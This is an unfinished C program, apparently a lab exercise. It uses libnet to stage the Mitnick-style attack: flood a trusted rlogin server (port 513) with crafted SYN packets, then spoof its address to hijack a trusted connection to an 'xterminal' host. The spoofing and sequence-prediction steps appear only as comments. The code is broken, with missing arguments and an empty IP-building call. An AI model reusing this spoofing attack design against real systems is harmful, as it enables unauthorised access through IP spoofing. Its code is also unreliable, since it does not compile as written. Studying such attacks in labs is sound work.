#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
#include <common.h>
#include <unistd.h>


//eth level data -> do I need this??
#define KEVIN_MAC "02:00:ac:10:10:02"
#define SERVER_MAC "02:00:ac:10:10:03"
#define XTERMINAL_MAC "02:00:ac:10:10:04"

//ip level data
#define KEVIN_IP "172.16.16.2"
#define SERVER_IP "172.16.16.3"
#define XTERMINAL_IP "172.16.16.4"

//tcp level data
#define PORT 513
#define PAYLOAD_DOS "disable"
#define PAYLOAD_RST "enable"

int send_syn(uint16_t dest_port, uint16_t h_len, const uint8_t *payload, uint32_t payload_s, libnet_t *l, libnet_ptag_t ptag);

int main (void)
{
	//initialize libnett stuff
	char e_buff[LIBNET_ERRBUF_SIZE];
	libnet_t * l;

	l = libnet_init(LIBNET_RAW4, "eth0", e_buff);
	if (l == NULL)
	{
		printf("libnet init error\n");
		exit(EXIT_FAILURE);
	}

	//start DOS part
	//ip conversion
	u_long server_ip = libnet_name2addr4(l, SERVER_IP, LIBNET_DONT_RESOLVE);
	u_long kevin_ip = libnet_name2addr4(l, KEVIN_IP, LIBNET_DONT_RESOLVE);

	if (server_ip == -1)
	{
		printf("error in server ip conversion\n");
		exit(EXIT_FAILURE);
	}
	if (kevin_ip == -1)
	{
		printf("error in kevin ip conversion\n");
		exit(EXIT_FAILURE);
	}

	//dos the server
	for (int i = 0; i < 10; i++)
	{
		//craft and send 10 packets with "disable" payload
		int  = send_syn(PORT, );
	}
	//now the server will ignore syn acks, that's exactly what I need because

	//I will send spoofed syn
	//The xterminal will send real synack to the server
	//I will respond with spoofed ack cause I know the server seq num
	//will have a trusted connection on the xterminal

	//contact xterminal to figure out next seq #


	//impersonate trusted server


	exit(EXIT_SUCCESS);
}


int send_syn(uint16_t dest_port, uint16_t h_len, const uint8_t *payload, uint32_t payload_s, libnet_t *l, libnet_ptag_t ptag)
{

	libnet_ptag_t t;
	//build syn
	t = libnet_build_tcp(
		libnet_get_prand(LIBNET_PRu16), //sp source port
		dest_port,											//dp destinatin port
		libnet_get_prand(LIBNET_PRu32), //sequence number
    libnet_get_prand(LIBNET_PRu32), //ack number, can I send whatever?
    TH_SYN,													//control bit SYN
		libnet_get_prand(LIBNET_PRu16), //window size, random is ok?
		0,															//checksum, if 0 libnet autofills
		0,															//urgent pointer ???
		LIBNET_TCP_H,										//len = tcp header + payload len
		payload,												//payload
		payload_s,											//payload size
		l,															//pointer to libnet context
		ptag														//protocol tag
	);

	if (t == -1)
	{
		printf("error while crafting tcp syn\n");
		exit(EXIT_FAILURE);
	}

	//build ip fragment containing syn
	t = libnet_build_ip(

	)

	//send to server

	return 1;
}
